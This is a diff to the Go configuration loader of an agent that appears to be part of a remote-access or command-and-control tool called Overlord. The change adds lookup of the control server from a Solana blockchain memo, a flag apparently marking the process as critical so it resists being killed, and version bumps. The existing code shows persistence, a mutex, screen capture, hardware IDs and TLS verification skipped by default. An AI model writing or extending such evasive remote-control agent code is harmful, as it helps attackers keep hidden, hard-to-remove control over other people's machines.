@@ -17,18 +17,21 @@ import (
 	"time"
 )
 
-var AgentVersion = "1.6.0"
+var AgentVersion = "1.7.6"
 
 var DefaultPersistence = "false"
 var DefaultServerURL = "wss://127.0.0.1:5173"
 var DefaultServerURLIsRaw = "false"
+var DefaultServerURLIsSol = "false"
+var DefaultSolAddress = ""
+var DefaultSolRPCEndpoints = ""
 var DefaultMutex = ""
 var DefaultID = ""
 var DefaultCountry = ""
 var DefaultAgentToken = ""
 var DefaultBuildTag = ""
 var DefaultSleepSeconds = "0"
-var DefaultJitterPercent = "20"
+var DefaultCriticalProcess = "false"
 
 const settingsFile = "config/settings.json"
 const serverIndexFile = "config/server_index.json"
@@ -48,6 +51,9 @@ type Config struct {
 	ServerURLs            []string
 	ServerIndex           int
 	RawServerListURL      string
+	SolEnabled            bool
+	SolAddress            string
+	SolRPCEndpoints       []string
 	Mutex                 string
 	ID                    string
 	HWID                  string
@@ -58,6 +64,7 @@ type Config struct {
 	CaptureInterval       time.Duration
 	DisableCapture        bool
 	EnablePersistence     bool
+	CriticalProcess       bool
 	TLSInsecureSkipVerify bool
 	TLSCAPath             string
 	TLSClientCert         string
@@ -65,7 +72,6 @@ type Config struct {
 	AgentToken            string
 	BuildTag              string
 	SleepSeconds          int
-	JitterPercent         int
 }
 
 func Load() Config {
@@ -80,9 +86,44 @@ func Load() Config {
 	}
 	rawServerEnabled := isTruthy(rawServerFlag)
 
+	solFlag := strings.TrimSpace(os.Getenv("OVERLORD_SERVER_SOL"))
+	if solFlag == "" {
+		solFlag = DefaultServerURLIsSol
+	}
+	solEnabled := isTruthy(solFlag)
+
+	solAddress := strings.TrimSpace(os.Getenv("OVERLORD_SOL_ADDRESS"))
+	if solAddress == "" {
+		solAddress = strings.TrimSpace(DefaultSolAddress)
+	}
+
+	solRPCEndpointsStr := strings.TrimSpace(os.Getenv("OVERLORD_SOL_RPC_ENDPOINTS"))
+	if solRPCEndpointsStr == "" {
+		solRPCEndpointsStr = strings.TrimSpace(DefaultSolRPCEndpoints)
+	}
+	var solRPCEndpoints []string
+	if solRPCEndpointsStr != "" {
+		for _, ep := range strings.Split(solRPCEndpointsStr, ",") {
+			ep = strings.TrimSpace(ep)
+			if ep != "" {
+				solRPCEndpoints = append(solRPCEndpoints, ep)
+			}
+		}
+	}
+
 	serverURLs := []string{}
 	rawServerListURL := ""
-	if rawServerEnabled {
+	if solEnabled && solAddress != "" && len(solRPCEndpoints) > 0 {
+		agentToken := strings.TrimSpace(os.Getenv("OVERLORD_AGENT_TOKEN"))
+		if agentToken == "" {
+			agentToken = strings.TrimSpace(DefaultAgentToken)
+		}
+		if urls, err := LoadServerURLsFromSolana(solAddress, agentToken, solRPCEndpoints); err != nil {
+			log.Printf("[config] WARNING: failed to load server URL from Solana memo: %v", err)
+		} else {
+			serverURLs = urls
+		}
+	} else if rawServerEnabled {
 		rawServerListURL = server
 		if rawServerListURL != "" {
 			if urls, err := LoadServerURLsFromRaw(rawServerListURL); err != nil {
@@ -125,6 +166,8 @@ func Load() Config {
 		enablePersistence = v == "true" || v == "1" || v == "yes"
 	}
 
+	criticalProcess := strings.ToLower(DefaultCriticalProcess) == "true"
+
 	tlsInsecureSkipVerify := true
 	if v := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_TLS_INSECURE_SKIP_VERIFY"))); v != "" {
 		tlsInsecureSkipVerify = v == "true" || v == "1" || v == "yes"
@@ -150,10 +193,14 @@ func Load() Config {
 		ServerURLs:            serverURLs,
 		ServerIndex:           serverIndex,
 		RawServerListURL:      rawServerListURL,
+		SolEnabled:            solEnabled,
+		SolAddress:            solAddress,
+		SolRPCEndpoints:       solRPCEndpoints,
 		Mutex:                 strings.TrimSpace(mutex),
 		ID:                    defaultHWID,
 		HWID:                  firstNonEmpty(fileSettings.HWID, defaultHWID),
 		EnablePersistence:     enablePersistence,
+		CriticalProcess:       criticalProcess,
 		Country:               firstNonEmpty(strings.TrimSpace(fileSettings.Country), DefaultCountry),
 		OS:                    runtime.GOOS,
 		Arch:                  runtime.GOARCH,
@@ -167,30 +214,12 @@ func Load() Config {
 		AgentToken:            agentToken,
 		BuildTag:              strings.TrimSpace(DefaultBuildTag),
 		SleepSeconds:          parseSleepSeconds(DefaultSleepSeconds),
-		JitterPercent:         parseJitterPercent(DefaultJitterPercent),
 	}
 }
 
 func isTruthy(value string) bool {
 	v := strings.ToLower(strings.TrimSpace(value))
 	return v == "true" || v == "1" || v == "yes" || v == "y"
-}
-
-func parseJitterPercent(s string) int {
-	n := 0
-	for _, c := range strings.TrimSpace(s) {
-		if c < '0' || c > '9' {
-			return 20
-		}
-		n = n*10 + int(c-'0')
-	}
-	if n < 0 {
-		return 0
-	}
-	if n > 50 {
-		return 50
-	}
-	return n
 }
 
 func parseSleepSeconds(s string) int {
